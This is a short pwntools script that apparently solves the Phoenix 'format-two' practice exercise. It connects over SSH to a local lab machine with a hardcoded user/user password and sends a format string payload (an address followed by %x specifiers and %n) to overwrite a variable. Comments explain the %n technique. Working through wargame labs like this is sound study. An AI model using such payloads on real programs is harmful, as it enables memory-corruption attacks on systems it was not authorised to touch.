#!/usr/bin/python
from pwn import *
s = ssh(user='user', host='localhost', password='user', port=2222)
# s.interactive()
# nm /opt/phoenix/i486/format-two | grep changeme
# worked while objdump gave the incorrect address
# %n changes the variable at the memory address after to to the
# length of the string before it
# using %n we were able to find out where on the stack the variable
# was
print(s['/opt/phoenix/i486/format-two $(python -c \'print "h\x98\x04\x08.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n"\')'])
s.close()
